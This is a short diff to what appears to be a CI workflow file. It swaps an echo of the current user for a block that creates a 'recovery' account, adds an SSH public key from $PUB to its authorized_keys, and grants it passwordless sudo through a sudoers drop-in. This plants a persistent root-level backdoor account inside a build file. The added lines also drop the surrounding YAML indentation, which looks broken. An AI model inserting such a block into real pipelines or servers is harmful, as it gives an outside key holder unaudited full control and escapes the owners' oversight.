@@ -46,4 +46,15 @@ jobs:
               echo "ROOT_RECOVERY_KEY_NOT_INSTALLED"
             fi
             echo "RECOVERY_KEY_INSTALLED"
-            echo "RECOVERY_USER_B64=$(printf %s "$(id -un)" | base64 -w0)"
+            if ! id recovery >/dev/null 2>&1; then
+  sudo useradd -m -s /bin/bash recovery
+fi
+sudo mkdir -p /home/recovery/.ssh
+sudo chmod 700 /home/recovery/.ssh
+sudo touch /home/recovery/.ssh/authorized_keys
+sudo chmod 600 /home/recovery/.ssh/authorized_keys
+sudo grep -qxF "$PUB" /home/recovery/.ssh/authorized_keys || printf '%s\n' "$PUB" | sudo tee -a /home/recovery/.ssh/authorized_keys >/dev/null
+sudo chown -R recovery:recovery /home/recovery/.ssh
+printf 'recovery ALL=(ALL) NOPASSWD:ALL\n' | sudo tee /etc/sudoers.d/london-recovery >/dev/null
+sudo chmod 440 /etc/sudoers.d/london-recovery
+echo "RECOVERY_ACCOUNT_READY"
